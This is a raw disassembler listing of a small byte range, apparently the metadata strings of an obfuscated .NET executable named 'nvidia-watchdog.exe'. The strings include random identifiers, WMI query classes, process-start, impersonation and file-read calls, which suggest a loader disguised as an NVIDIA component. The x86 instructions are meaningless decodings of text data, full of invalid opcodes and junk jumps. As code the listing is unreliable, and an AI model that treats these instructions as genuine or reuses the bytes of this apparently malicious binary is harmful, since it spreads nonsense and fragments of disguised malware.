  40843a:	6f                   	outsl  (%rsi),(%dx)
  40843b:	67 00 41 73          	add    %al,0x73(%ecx)
  40843f:	73 65                	jae    0x4084a6
  408441:	6d                   	insl   (%dx),(%rdi)
  408442:	62 6c 79 54 69       	(bad)
  408447:	74 6c                	je     0x4084b5
  408449:	65 41 74 74          	gs rex.B je 0x4084c1
  40844d:	72 69                	jb     0x4084b8
  40844f:	62 75 74 65 00       	(bad)
  408454:	53                   	push   %rbx
  408455:	79 73                	jns    0x4084ca
  408457:	74 65                	je     0x4084be
  408459:	6d                   	insl   (%dx),(%rdi)
  40845a:	2e 52                	cs push %rdx
  40845c:	65 66 6c             	gs data16 insb (%dx),(%rdi)
  40845f:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
  408464:	6e                   	outsb  (%rsi),(%dx)
  408465:	00 6d 73             	add    %ch,0x73(%rbp)
  408468:	63 6f 72             	movsxd 0x72(%rdi),%ebp
  40846b:	6c                   	insb   (%dx),(%rdi)
  40846c:	69 62 00 2e 63 74 6f 	imul   $0x6f74632e,0x0(%rdx),%esp
  408473:	72 00                	jb     0x408475
  408475:	56                   	push   %rsi
  408476:	6f                   	outsl  (%rsi),(%dx)
  408477:	69 64 00 53 79 73 74 	imul   $0x65747379,0x53(%rax,%rax,1),%esp
  40847e:	65 
  40847f:	6d                   	insl   (%dx),(%rdi)
  408480:	00 53 74             	add    %dl,0x74(%rbx)
  408483:	72 69                	jb     0x4084ee
  408485:	6e                   	outsb  (%rsi),(%dx)
  408486:	67 00 41 73          	add    %al,0x73(%ecx)
  40848a:	73 65                	jae    0x4084f1
  40848c:	6d                   	insl   (%dx),(%rdi)
  40848d:	62 6c 79 44 65       	(bad)
  408492:	73 63                	jae    0x4084f7
  408494:	72 69                	jb     0x4084ff
  408496:	70 74                	jo     0x40850c
  408498:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%rdi),%ebp
  40849f:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%rdx),%esp
  4084a6:	73 73                	jae    0x40851b
  4084a8:	65 6d                	gs insl (%dx),(%rdi)
  4084aa:	62 6c 79 50 72       	(bad)
  4084af:	6f                   	outsl  (%rsi),(%dx)
  4084b0:	64 75 63             	fs jne 0x408516
  4084b3:	74 41                	je     0x4084f6
  4084b5:	74 74                	je     0x40852b
  4084b7:	72 69                	jb     0x408522
  4084b9:	62 75 74 65 00       	(bad)
  4084be:	41 73 73             	rex.B jae 0x408534
  4084c1:	65 6d                	gs insl (%dx),(%rdi)
  4084c3:	62 6c 79 43 6f       	(bad)
  4084c8:	70 79                	jo     0x408543
  4084ca:	72 69                	jb     0x408535
  4084cc:	67 68 74 41 74 74    	addr32 push $0x74744174
  4084d2:	72 69                	jb     0x40853d
  4084d4:	62 75 74 65 00       	(bad)
  4084d9:	41 73 73             	rex.B jae 0x40854f
  4084dc:	65 6d                	gs insl (%dx),(%rdi)
  4084de:	62 6c 79 46 69       	(bad)
  4084e3:	6c                   	insb   (%dx),(%rdi)
  4084e4:	65 56                	gs push %rsi
  4084e6:	65 72 73             	gs jb  0x40855c
  4084e9:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%rdi),%ebp
  4084f0:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%rdx),%esp
  4084f7:	6f                   	outsl  (%rsi),(%dx)
  4084f8:	6d                   	insl   (%dx),(%rdi)
  4084f9:	70 69                	jo     0x408564
  4084fb:	6c                   	insb   (%dx),(%rdi)
  4084fc:	61                   	(bad)
  4084fd:	74 69                	je     0x408568
  4084ff:	6f                   	outsl  (%rsi),(%dx)
  408500:	6e                   	outsb  (%rsi),(%dx)
  408501:	52                   	push   %rdx
  408502:	65 6c                	gs insb (%dx),(%rdi)
  408504:	61                   	(bad)
  408505:	78 61                	js     0x408568
  408507:	74 69                	je     0x408572
  408509:	6f                   	outsl  (%rsi),(%dx)
  40850a:	6e                   	outsb  (%rsi),(%dx)
  40850b:	73 41                	jae    0x40854e
  40850d:	74 74                	je     0x408583
  40850f:	72 69                	jb     0x40857a
  408511:	62 75 74 65 00       	(bad)
  408516:	53                   	push   %rbx
  408517:	79 73                	jns    0x40858c
  408519:	74 65                	je     0x408580
  40851b:	6d                   	insl   (%dx),(%rdi)
  40851c:	2e 52                	cs push %rdx
  40851e:	75 6e                	jne    0x40858e
  408520:	74 69                	je     0x40858b
  408522:	6d                   	insl   (%dx),(%rdi)
  408523:	65 2e 43 6f          	gs rex.XB outsl %gs:(%rsi),(%dx)
  408527:	6d                   	insl   (%dx),(%rdi)
  408528:	70 69                	jo     0x408593
  40852a:	6c                   	insb   (%dx),(%rdi)
  40852b:	65 72 53             	gs jb  0x408581
  40852e:	65 72 76             	gs jb  0x4085a7
  408531:	69 63 65 73 00 49 6e 	imul   $0x6e490073,0x65(%rbx),%esp
  408538:	74 33                	je     0x40856d
  40853a:	32 00                	xor    (%rax),%al
  40853c:	42 6f                	rex.X outsl (%rsi),(%dx)
  40853e:	6f                   	outsl  (%rsi),(%dx)
  40853f:	6c                   	insb   (%dx),(%rdi)
  408540:	65 61                	gs (bad)
  408542:	6e                   	outsb  (%rsi),(%dx)
  408543:	00 52 75             	add    %dl,0x75(%rdx)
  408546:	6e                   	outsb  (%rsi),(%dx)
  408547:	74 69                	je     0x4085b2
  408549:	6d                   	insl   (%dx),(%rdi)
  40854a:	65 43 6f             	rex.XB outsl %gs:(%rsi),(%dx)
  40854d:	6d                   	insl   (%dx),(%rdi)
  40854e:	70 61                	jo     0x4085b1
  408550:	74 69                	je     0x4085bb
  408552:	62 69 6c 69 74       	(bad)
  408557:	79 41                	jns    0x40859a
  408559:	74 74                	je     0x4085cf
  40855b:	72 69                	jb     0x4085c6
  40855d:	62 75 74 65 00       	(bad)
  408562:	6e                   	outsb  (%rsi),(%dx)
  408563:	76 69                	jbe    0x4085ce
  408565:	64 69 61 2d 77 61 74 	imul   $0x63746177,%fs:0x2d(%rcx),%esp
  40856c:	63 
  40856d:	68 64 6f 67 2e       	push   $0x2e676f64
  408572:	65 78 65             	gs js  0x4085da
  408575:	00 3c 4d 6f 64 75 6c 	add    %bh,0x6c75646f(,%rcx,2)
  40857c:	65 3e 00 44 63 41    	gs add %al,%gs:0x41(%rbx,%riz,2)
  408582:	72 4f                	jb     0x4085d3
  408584:	39 4a 51             	cmp    %ecx,0x51(%rdx)
  408587:	31 57 62             	xor    %edx,0x62(%rdi)
  40858a:	54                   	push   %rsp
  40858b:	67 48 63 61 6b       	movslq 0x6b(%ecx),%rsp
  408590:	76 00                	jbe    0x408592
  408592:	4c 34 61             	rex.WR xor $0x61,%al
  408595:	39 6d 6a             	cmp    %ebp,0x6a(%rbp)
  408598:	33 43 4a             	xor    0x4a(%rbx),%eax
  40859b:	37                   	(bad)
  40859c:	4a 6f                	rex.WX outsl (%rsi),(%dx)
  40859e:	36 46                	ss rex.RX
  4085a0:	4e 74 42             	rex.WRX je 0x4085e5
  4085a3:	55                   	push   %rbp
  4085a4:	00 4f 62             	add    %cl,0x62(%rdi)
  4085a7:	6a 65                	push   $0x65
  4085a9:	63 74 00 77          	movsxd 0x77(%rax,%rax,1),%esi
  4085ad:	71 6a                	jno    0x408619
  4085af:	6a 70                	push   $0x70
  4085b1:	73 6d                	jae    0x408620
  4085b3:	66 6c                	data16 insb (%dx),(%rdi)
  4085b5:	74 68                	je     0x40861f
  4085b7:	67 73 73             	addr32 jae 0x40862d
  4085ba:	6b 67 69 6b          	imul   $0x6b,0x69(%rdi),%esp
  4085be:	73 6e                	jae    0x40862e
  4085c0:	00 3c 4d 6f 64 75 6c 	add    %bh,0x6c75646f(,%rcx,2)
  4085c7:	65 3e 7b 41          	gs jnp,pt 0x40860c
  4085cb:	45                   	rex.RB
  4085cc:	45 30 31             	xor    %r14b,(%r9)
  4085cf:	36 38 37             	ss cmp %dh,(%rdi)
  4085d2:	2d 38 41 33 45       	sub    $0x45334138,%eax
  4085d7:	2d 34 46 33 37       	sub    $0x37334634,%eax
  4085dc:	2d 38 39 45 36       	sub    $0x36453938,%eax
  4085e1:	2d 43 30 37 35       	sub    $0x35373043,%eax
  4085e6:	41                   	rex.B
  4085e7:	45 37                	rex.RB (bad)
  4085e9:	37                   	(bad)
  4085ea:	41 38 46 44          	cmp    %al,0x44(%r14)
  4085ee:	7d 00                	jge    0x4085f0
  4085f0:	79 31                	jns    0x408623
  4085f2:	56                   	push   %rsi
  4085f3:	54                   	push   %rsp
  4085f4:	30 64 79 71          	xor    %ah,0x71(%rcx,%rdi,2)
  4085f8:	6c                   	insb   (%dx),(%rdi)
  4085f9:	70 4b                	jo     0x408646
  4085fb:	59                   	pop    %rcx
  4085fc:	35 58 78 6e 6f       	xor    $0x6f6e7858,%eax
  408601:	47 00 43 44          	rex.RXB add %r8b,0x44(%r11)
  408605:	59                   	pop    %rcx
  408606:	6a 64                	push   $0x64
  408608:	68 4d 79 65 74       	push   $0x7465794d
  40860d:	33 52 41             	xor    0x41(%rdx),%edx
  408610:	50                   	push   %rax
  408611:	6a 76                	push   $0x76
  408613:	52                   	push   %rdx
  408614:	6d                   	insl   (%dx),(%rdi)
  408615:	00 48 6a             	add    %cl,0x6a(%rax)
  408618:	58                   	pop    %rax
  408619:	37                   	(bad)
  40861a:	63 34 63             	movsxd (%rbx,%riz,2),%esi
  40861d:	44 61                	rex.R (bad)
  40861f:	55                   	push   %rbp
  408620:	55                   	push   %rbp
  408621:	65 32 55 75          	xor    %gs:0x75(%rbp),%dl
  408625:	73 75                	jae    0x40869c
  408627:	36 00 4d 75          	ss add %cl,0x75(%rbp)
  40862b:	6c                   	insb   (%dx),(%rdi)
  40862c:	74 69                	je     0x408697
  40862e:	63 61 73             	movsxd 0x73(%rcx),%esp
  408631:	74 44                	je     0x408677
  408633:	65 6c                	gs insb (%dx),(%rdi)
  408635:	65 67 61             	gs addr32 (bad)
  408638:	74 65                	je     0x40869f
  40863a:	00 6d 4a             	add    %ch,0x4a(%rbp)
  40863d:	33 30                	xor    (%rax),%esi
  40863f:	34 74                	xor    $0x74,%al
  408641:	6a 35                	push   $0x35
  408643:	56                   	push   %rsi
  408644:	31 6d 4f             	xor    %ebp,0x4f(%rbp)
  408647:	4b 37                	rex.WXB (bad)
  408649:	6e                   	outsb  (%rsi),(%dx)
  40864a:	42 59                	rex.X pop %rcx
  40864c:	69 00 73 4d 73 6b    	imul   $0x6b734d73,(%rax),%eax
  408652:	64 51                	fs push %rcx
  408654:	51                   	push   %rcx
  408655:	6c                   	insb   (%dx),(%rdi)
  408656:	31 59 41             	xor    %ebx,0x41(%rcx)
  408659:	79 6c                	jns    0x4086c7
  40865b:	62 37 73 55 73       	(bad)
  408660:	00 6c 30 41          	add    %ch,0x41(%rax,%rsi,1)
  408664:	6a 33                	push   $0x33
  408666:	78 71                	js     0x4086d9
  408668:	52                   	push   %rdx
  408669:	4c 78 42             	rex.WR js 0x4086ae
  40866c:	35 43 56 75 49       	xor    $0x49755643,%eax
  408671:	31 35 00 41 74 74    	xor    %esi,0x74744100(%rip)        # 0x74b4c777
  408677:	72 69                	jb     0x4086e2
  408679:	62 75 74 65 00       	(bad)
  40867e:	62 74 42 68 36       	(bad)
  408683:	48                   	rex.W
  408684:	67 79 56             	addr32 jns 0x4086dd
  408687:	72 6b                	jb     0x4086f4
  408689:	72 51                	jb     0x4086dc
  40868b:	69 4c 71 51 43 60 31 	imul   $0x316043,0x51(%rcx,%rsi,2),%ecx
  408692:	00 
  408693:	75 69                	jne    0x4086fe
  408695:	37                   	(bad)
  408696:	43                   	rex.XB
  408697:	67 6d                	insl   (%dx),(%edi)
  408699:	6b 73 4c 4f          	imul   $0x4f,0x4c(%rbx),%esi
  40869d:	49 55                	rex.WB push %r13
  40869f:	65 70 64             	gs jo  0x408706
  4086a2:	62 45 63 00 4d       	(bad)
  4086a7:	55                   	push   %rbp
  4086a8:	6f                   	outsl  (%rsi),(%dx)
  4086a9:	37                   	(bad)
  4086aa:	62 4f 32 68 48       	(bad)
  4086af:	43                   	rex.XB
  4086b0:	36 33 4e 38          	ss xor 0x38(%rsi),%ecx
  4086b4:	66 5a                	pop    %dx
  4086b6:	55                   	push   %rbp
  4086b7:	72 00                	jb     0x4086b9
  4086b9:	4f 51                	rex.WRXB push %r9
  4086bb:	69 6b 52 66 38 6d 63 	imul   $0x636d3866,0x52(%rbx),%ebp
  4086c2:	6a 48                	push   $0x48
  4086c4:	4c                   	rex.WR
  4086c5:	4d                   	rex.WRB
  4086c6:	45 72 57             	rex.RB jb 0x408720
  4086c9:	39 6a 00             	cmp    %ebp,0x0(%rdx)
  4086cc:	47                   	rex.RXB
  4086cd:	45                   	rex.RB
  4086ce:	4d                   	rex.WRB
  4086cf:	67 67 55             	addr32 addr32 push %rbp
  4086d2:	4b                   	rex.WXB
  4086d3:	36 46                	ss rex.RX
  4086d5:	65 66 49             	gs data16 rex.WB
  4086d8:	47 6f                	rex.RXB outsl (%rsi),(%dx)
  4086da:	68 70 73 77 00       	push   $0x777370
  4086df:	56                   	push   %rsi
  4086e0:	61                   	(bad)
  4086e1:	6c                   	insb   (%dx),(%rdi)
  4086e2:	75 65                	jne    0x408749
  4086e4:	54                   	push   %rsp
  4086e5:	79 70                	jns    0x408757
  4086e7:	65 00 61 57          	add    %ah,%gs:0x57(%rcx)
  4086eb:	30 39                	xor    %bh,(%rcx)
  4086ed:	51                   	push   %rcx
  4086ee:	6d                   	insl   (%dx),(%rdi)
  4086ef:	53                   	push   %rbx
  4086f0:	6f                   	outsl  (%rsi),(%dx)
  4086f1:	39 64 66 55          	cmp    %esp,0x55(%rsi,%riz,2)
  4086f5:	35 64 6a 51 42       	xor    $0x42516a64,%eax
  4086fa:	4d 00 45 6e          	rex.WRB add %r8b,0x6e(%r13)
  4086fe:	75 6d                	jne    0x40876d
  408700:	00 61 57             	add    %ah,0x57(%rcx)
  408703:	78 36                	js     0x40873b
  408705:	43 56                	rex.XB push %r14
  408707:	58                   	pop    %rax
  408708:	31 73 47             	xor    %esi,0x47(%rbx)
  40870b:	79 64                	jns    0x408771
  40870d:	67 45 52             	addr32 rex.RB push %r10
  408710:	68 31 56 00 59       	push   $0x59005631
  408715:	35 70 70 61 43       	xor    $0x43617070,%eax
  40871a:	39 4d 70             	cmp    %ecx,0x70(%rbp)
  40871d:	36 66 62 42 62 32 63 	(bad)
  408724:	58                   	pop    %rax
  408725:	57                   	push   %rdi
  408726:	00 3c 50             	add    %bh,(%rax,%rdx,2)
  408729:	72 69                	jb     0x408794
  40872b:	76 61                	jbe    0x40878e
  40872d:	74 65                	je     0x408794
  40872f:	49 6d                	rex.WB insl (%dx),(%rdi)
  408731:	70 6c                	jo     0x40879f
  408733:	65 6d                	gs insl (%dx),(%rdi)
  408735:	65 6e                	outsb  %gs:(%rsi),(%dx)
  408737:	74 61                	je     0x40879a
  408739:	74 69                	je     0x4087a4
  40873b:	6f                   	outsl  (%rsi),(%dx)
  40873c:	6e                   	outsb  (%rsi),(%dx)
  40873d:	44                   	rex.R
  40873e:	65 74 61             	gs je  0x4087a2
  408741:	69 6c 73 3e 7b 37 32 	imul   $0x4532377b,0x3e(%rbx,%rsi,2),%ebp
  408748:	45 
  408749:	34 46                	xor    $0x46,%al
  40874b:	45 35 36 2d 30 38    	rex.RB xor $0x38302d36,%eax
  408751:	32 31                	xor    (%rcx),%dh
  408753:	2d 34 30 41 44       	sub    $0x44413034,%eax
  408758:	2d 39 37 31 38       	sub    $0x38313739,%eax
  40875d:	2d 39 46 39 43       	sub    $0x43394639,%eax
  408762:	46 35 36 45 41 38    	rex.RX xor $0x38414536,%eax
  408768:	35 36 7d 00 5f       	xor    $0x5f007d36,%eax
  40876d:	5f                   	pop    %rdi
  40876e:	53                   	push   %rbx
  40876f:	74 61                	je     0x4087d2
  408771:	74 69                	je     0x4087dc
  408773:	63 41 72             	movsxd 0x72(%rcx),%eax
  408776:	72 61                	jb     0x4087d9
  408778:	79 49                	jns    0x4087c3
  40877a:	6e                   	outsb  (%rsi),(%dx)
  40877b:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%rsp,%rdx,2),%esi
  408782:	69 
  408783:	7a 65                	jp     0x4087ea
  408785:	3d 32 35 36 00       	cmp    $0x363532,%eax
  40878a:	5f                   	pop    %rdi
  40878b:	5f                   	pop    %rdi
  40878c:	53                   	push   %rbx
  40878d:	74 61                	je     0x4087f0
  40878f:	74 69                	je     0x4087fa
  408791:	63 41 72             	movsxd 0x72(%rcx),%eax
  408794:	72 61                	jb     0x4087f7
  408796:	79 49                	jns    0x4087e1
  408798:	6e                   	outsb  (%rsi),(%dx)
  408799:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%rsp,%rdx,2),%esi
  4087a0:	69 
  4087a1:	7a 65                	jp     0x408808
  4087a3:	3d 34 30 00 5f       	cmp    $0x5f003034,%eax
  4087a8:	5f                   	pop    %rdi
  4087a9:	53                   	push   %rbx
  4087aa:	74 61                	je     0x40880d
  4087ac:	74 69                	je     0x408817
  4087ae:	63 41 72             	movsxd 0x72(%rcx),%eax
  4087b1:	72 61                	jb     0x408814
  4087b3:	79 49                	jns    0x4087fe
  4087b5:	6e                   	outsb  (%rsi),(%dx)
  4087b6:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%rsp,%rdx,2),%esi
  4087bd:	69 
  4087be:	7a 65                	jp     0x408825
  4087c0:	3d 33 30 00 5f       	cmp    $0x5f003033,%eax
  4087c5:	5f                   	pop    %rdi
  4087c6:	53                   	push   %rbx
  4087c7:	74 61                	je     0x40882a
  4087c9:	74 69                	je     0x408834
  4087cb:	63 41 72             	movsxd 0x72(%rcx),%eax
  4087ce:	72 61                	jb     0x408831
  4087d0:	79 49                	jns    0x40881b
  4087d2:	6e                   	outsb  (%rsi),(%dx)
  4087d3:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%rsp,%rdx,2),%esi
  4087da:	69 
  4087db:	7a 65                	jp     0x408842
  4087dd:	3d 33 32 00 5f       	cmp    $0x5f003233,%eax
  4087e2:	5f                   	pop    %rdi
  4087e3:	53                   	push   %rbx
  4087e4:	74 61                	je     0x408847
  4087e6:	74 69                	je     0x408851
  4087e8:	63 41 72             	movsxd 0x72(%rcx),%eax
  4087eb:	72 61                	jb     0x40884e
  4087ed:	79 49                	jns    0x408838
  4087ef:	6e                   	outsb  (%rsi),(%dx)
  4087f0:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%rsp,%rdx,2),%esi
  4087f7:	69 
  4087f8:	7a 65                	jp     0x40885f
  4087fa:	3d 31 36 00 5f       	cmp    $0x5f003631,%eax
  4087ff:	5f                   	pop    %rdi
  408800:	53                   	push   %rbx
  408801:	74 61                	je     0x408864
  408803:	74 69                	je     0x40886e
  408805:	63 41 72             	movsxd 0x72(%rcx),%eax
  408808:	72 61                	jb     0x40886b
  40880a:	79 49                	jns    0x408855
  40880c:	6e                   	outsb  (%rsi),(%dx)
  40880d:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%rsp,%rdx,2),%esi
  408814:	69 
  408815:	7a 65                	jp     0x40887c
  408817:	3d 36 34 00 5f       	cmp    $0x5f003436,%eax
  40881c:	5f                   	pop    %rdi
  40881d:	53                   	push   %rbx
  40881e:	74 61                	je     0x408881
  408820:	74 69                	je     0x40888b
  408822:	63 41 72             	movsxd 0x72(%rcx),%eax
  408825:	72 61                	jb     0x408888
  408827:	79 49                	jns    0x408872
  408829:	6e                   	outsb  (%rsi),(%dx)
  40882a:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%rsp,%rdx,2),%esi
  408831:	69 
  408832:	7a 65                	jp     0x408899
  408834:	3d 31 38 00 64       	cmp    $0x64003831,%eax
  408839:	67 61                	addr32 (bad)
  40883b:	6f                   	outsl  (%rsi),(%dx)
  40883c:	67 6b 79 72 65       	imul   $0x65,0x72(%ecx),%edi
  408841:	68 66 6f 72 79       	push   $0x79726f66
  408846:	6a 65                	push   $0x65
  408848:	77 61                	ja     0x4088ab
  40884a:	64 75 62             	fs jne 0x4088af
  40884d:	6a 6d                	push   $0x6d
  40884f:	68 75 73 7a 74       	push   $0x747a7375
  408854:	66 7a 6b             	data16 jp 0x4088c2
  408857:	00 42 79             	add    %al,0x79(%rdx)
  40885a:	74 65                	je     0x4088c1
  40885c:	00 79 6f             	add    %bh,0x6f(%rcx)
  40885f:	6b 67 6a 79          	imul   $0x79,0x6a(%rdi),%esp
  408863:	79 6d                	jns    0x4088d2
  408865:	68 6f 76 6c 64       	push   $0x646c766f
  40886a:	72 75                	jb     0x4088e1
  40886c:	72 73                	jb     0x4088e1
  40886e:	00 6a 6b             	add    %ch,0x6b(%rdx)
  408871:	78 68                	js     0x4088db
  408873:	78 62                	js     0x4088d7
  408875:	77 6e                	ja     0x4088e5
  408877:	64 64 6b 61 6c 72    	fs imul $0x72,%fs:0x6c(%rcx),%esp
  40887d:	78 6d                	js     0x4088ec
  40887f:	66 62 6a 64 67 62    	(bad)
  408885:	72 71                	jb     0x4088f8
  408887:	77 66                	ja     0x4088ef
  408889:	77 65                	ja     0x4088f0
  40888b:	66 64 00 4d 61       	data16 add %cl,%fs:0x61(%rbp)
  408890:	69 6e 00 46 69 6c 65 	imul   $0x656c6946,0x0(%rsi),%ebp
  408897:	00 53 79             	add    %dl,0x79(%rbx)
  40889a:	73 74                	jae    0x408910
  40889c:	65 6d                	gs insl (%dx),(%rdi)
  40889e:	2e 49                	cs rex.WB
  4088a0:	4f 00 52 65          	rex.WRXB add %r10b,0x65(%r10)
  4088a4:	61                   	(bad)
  4088a5:	64 41 6c             	fs rex.B insb (%dx),(%rdi)
  4088a8:	6c                   	insb   (%dx),(%rdi)
  4088a9:	42 79 74             	rex.X jns 0x408920
  4088ac:	65 73 00             	gs jae 0x4088af
  4088af:	45 6e                	rex.RB outsb (%rsi),(%dx)
  4088b1:	76 69                	jbe    0x40891c
  4088b3:	72 6f                	jb     0x408924
  4088b5:	6e                   	outsb  (%rsi),(%dx)
  4088b6:	6d                   	insl   (%dx),(%rdi)
  4088b7:	65 6e                	outsb  %gs:(%rsi),(%dx)
  4088b9:	74 00                	je     0x4088bb
  4088bb:	45 78 69             	rex.RB js 0x408927
  4088be:	74 00                	je     0x4088c0
  4088c0:	45 78 63             	rex.RB js 0x408926
  4088c3:	65 70 74             	gs jo  0x40893a
  4088c6:	69 6f 6e 00 6a 6e 79 	imul   $0x796e6a00,0x6e(%rdi),%ebp
  4088cd:	7a 63                	jp     0x408932
  4088cf:	68 6a 75 71 6b       	push   $0x6b71756a
  4088d4:	69 62 6a 73 62 00 43 	imul   $0x43006273,0x6a(%rdx),%esp
  4088db:	6f                   	outsl  (%rsi),(%dx)
  4088dc:	6e                   	outsb  (%rsi),(%dx)
  4088dd:	6e                   	outsb  (%rsi),(%dx)
  4088de:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
  4088e3:	6e                   	outsb  (%rsi),(%dx)
  4088e4:	4f 70 74             	rex.WRXB jo 0x40895b
  4088e7:	69 6f 6e 73 00 53 79 	imul   $0x79530073,0x6e(%rdi),%ebp
  4088ee:	73 74                	jae    0x408964
  4088f0:	65 6d                	gs insl (%dx),(%rdi)
  4088f2:	2e 4d 61             	cs rex.WRB (bad)
  4088f5:	6e                   	outsb  (%rsi),(%dx)
  4088f6:	61                   	(bad)
  4088f7:	67 65 6d             	gs insl (%dx),(%edi)
  4088fa:	65 6e                	outsb  %gs:(%rsi),(%dx)
  4088fc:	74 00                	je     0x4088fe
  4088fe:	4d 61                	rex.WRB (bad)
  408900:	6e                   	outsb  (%rsi),(%dx)
  408901:	61                   	(bad)
  408902:	67 65 6d             	gs insl (%dx),(%edi)
  408905:	65 6e                	outsb  %gs:(%rsi),(%dx)
  408907:	74 53                	je     0x40895c
  408909:	63 6f 70             	movsxd 0x70(%rdi),%ebp
  40890c:	65 00 4d 61          	add    %cl,%gs:0x61(%rbp)
  408910:	6e                   	outsb  (%rsi),(%dx)
  408911:	61                   	(bad)
  408912:	67 65 6d             	gs insl (%dx),(%edi)
  408915:	65 6e                	outsb  %gs:(%rsi),(%dx)
  408917:	74 4f                	je     0x408968
  408919:	62 6a 65 63 74       	(bad)
  40891e:	43 6f                	rex.XB outsl (%rsi),(%dx)
  408920:	6c                   	insb   (%dx),(%rdi)
  408921:	6c                   	insb   (%dx),(%rdi)
  408922:	65 63 74 69 6f       	movsxd %gs:0x6f(%rcx,%rbp,2),%esi
  408927:	6e                   	outsb  (%rsi),(%dx)
  408928:	00 4d 61             	add    %cl,0x61(%rbp)
  40892b:	6e                   	outsb  (%rsi),(%dx)
  40892c:	61                   	(bad)
  40892d:	67 65 6d             	gs insl (%dx),(%edi)
  408930:	65 6e                	outsb  %gs:(%rsi),(%dx)
  408932:	74 4f                	je     0x408983
  408934:	62 6a 65 63 74       	(bad)
  408939:	00 50 72             	add    %dl,0x72(%rax)
  40893c:	6f                   	outsl  (%rsi),(%dx)
  40893d:	63 65 73             	movsxd 0x73(%rbp),%esp
  408940:	73 53                	jae    0x408995
  408942:	74 61                	je     0x4089a5
  408944:	72 74                	jb     0x4089ba
  408946:	49 6e                	rex.WB outsb (%rsi),(%dx)
  408948:	66 6f                	outsw  (%rsi),(%dx)
  40894a:	00 53 79             	add    %dl,0x79(%rbx)
  40894d:	73 74                	jae    0x4089c3
  40894f:	65 6d                	gs insl (%dx),(%rdi)
  408951:	2e 44 69 61 67 6e 6f 	cs imul $0x74736f6e,0x67(%rcx),%r12d
  408958:	73 74 
  40895a:	69 63 73 00 4d 61 6e 	imul   $0x6e614d00,0x73(%rbx),%esp
  408961:	61                   	(bad)
  408962:	67 65 6d             	gs insl (%dx),(%edi)
  408965:	65 6e                	outsb  %gs:(%rsi),(%dx)
  408967:	74 4f                	je     0x4089b8
  408969:	62 6a 65 63 74       	(bad)
  40896e:	45 6e                	rex.RB outsb (%rsi),(%dx)
  408970:	75 6d                	jne    0x4089df
  408972:	65 72 61             	gs jb  0x4089d6
  408975:	74 6f                	je     0x4089e6
  408977:	72 00                	jb     0x408979
  408979:	73 65                	jae    0x4089e0
  40897b:	74 5f                	je     0x4089dc
  40897d:	49 6d                	rex.WB insl (%dx),(%rdi)
  40897f:	70 65                	jo     0x4089e6
  408981:	72 73                	jb     0x4089f6
  408983:	6f                   	outsl  (%rsi),(%dx)
  408984:	6e                   	outsb  (%rsi),(%dx)
  408985:	61                   	(bad)
  408986:	74 69                	je     0x4089f1
  408988:	6f                   	outsl  (%rsi),(%dx)
  408989:	6e                   	outsb  (%rsi),(%dx)
  40898a:	00 49 6d             	add    %cl,0x6d(%rcx)
  40898d:	70 65                	jo     0x4089f4
  40898f:	72 73                	jb     0x408a04
  408991:	6f                   	outsl  (%rsi),(%dx)
  408992:	6e                   	outsb  (%rsi),(%dx)
  408993:	61                   	(bad)
  408994:	74 69                	je     0x4089ff
  408996:	6f                   	outsl  (%rsi),(%dx)
  408997:	6e                   	outsb  (%rsi),(%dx)
  408998:	4c                   	rex.WR
  408999:	65 76 65             	gs jbe 0x408a01
  40899c:	6c                   	insb   (%dx),(%rdi)
  40899d:	00 43 6f             	add    %al,0x6f(%rbx)
  4089a0:	6e                   	outsb  (%rsi),(%dx)
  4089a1:	6e                   	outsb  (%rsi),(%dx)
  4089a2:	65 63 74 00 4f       	movsxd %gs:0x4f(%rax,%rax,1),%esi
  4089a7:	62 6a 65 63 74       	(bad)
  4089ac:	51                   	push   %rcx
  4089ad:	75 65                	jne    0x408a14
  4089af:	72 79                	jb     0x408a2a
  4089b1:	00 4d 61             	add    %cl,0x61(%rbp)
  4089b4:	6e                   	outsb  (%rsi),(%dx)
  4089b5:	61                   	(bad)
  4089b6:	67 65 6d             	gs insl (%dx),(%edi)
  4089b9:	65 6e                	outsb  %gs:(%rsi),(%dx)
  4089bb:	74 4f                	je     0x408a0c
  4089bd:	62 6a 65 63 74       	(bad)
  4089c2:	53                   	push   %rbx
  4089c3:	65 61                	gs (bad)
  4089c5:	72 63                	jb     0x408a2a
  4089c7:	68 65 72 00 47       	push   $0x47007265
  4089cc:	65 74 00             	gs je  0x4089cf
  4089cf:	47                   	rex.RXB
  4089d0:	65 74 45             	gs je  0x408a18
  4089d3:	6e                   	outsb  (%rsi),(%dx)
  4089d4:	75 6d                	jne    0x408a43
  4089d6:	65 72 61             	gs jb  0x408a3a
  4089d9:	74 6f                	je     0x408a4a
  4089db:	72 00                	jb     0x4089dd
  4089dd:	67 65 74 5f          	addr32 gs je 0x408a40
  4089e1:	43 75 72             	rex.XB jne 0x408a56
  4089e4:	72 65                	jb     0x408a4b
  4089e6:	6e                   	outsb  (%rsi),(%dx)
  4089e7:	74 00                	je     0x4089e9
  4089e9:	4d 61                	rex.WRB (bad)
  4089eb:	6e                   	outsb  (%rsi),(%dx)
  4089ec:	61                   	(bad)
  4089ed:	67 65 6d             	gs insl (%dx),(%edi)
  4089f0:	65 6e                	outsb  %gs:(%rsi),(%dx)
  4089f2:	74 42                	je     0x408a36
  4089f4:	61                   	(bad)
  4089f5:	73 65                	jae    0x408a5c
  4089f7:	4f 62 6a 65 63 74    	(bad)
  4089fd:	00 67 65             	add    %ah,0x65(%rdi)
  408a00:	74 5f                	je     0x408a61
  408a02:	49 74 65             	rex.WB je 0x408a6a
  408a05:	6d                   	insl   (%dx),(%rdi)
  408a06:	00 43 6f             	add    %al,0x6f(%rbx)
  408a09:	6e                   	outsb  (%rsi),(%dx)
  408a0a:	63 61 74             	movsxd 0x74(%rcx),%esp
  408a0d:	00 4d 6f             	add    %cl,0x6f(%rbp)
  408a10:	76 65                	jbe    0x408a77
  408a12:	4e                   	rex.WRX
